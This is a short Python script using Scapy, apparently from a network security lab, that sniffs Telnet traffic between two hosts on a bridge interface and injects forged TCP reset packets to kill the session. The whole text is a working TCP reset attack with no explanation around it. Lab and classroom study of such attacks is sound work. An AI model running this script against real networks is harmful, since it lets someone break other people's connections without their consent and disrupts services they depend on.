from scapy.all import *
def spoof(pkt):
    ip = IP(src="10.9.0.5", dst="10.9.0.6")
    tcp = TCP(sport=23, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

f1 = 'tcp && src 10.9.0.6 && dst 10.9.0.5 && dst port 23'
pkt = sniff(filter = f1, iface = 'br-fadf410f3fed',prn = spoof)
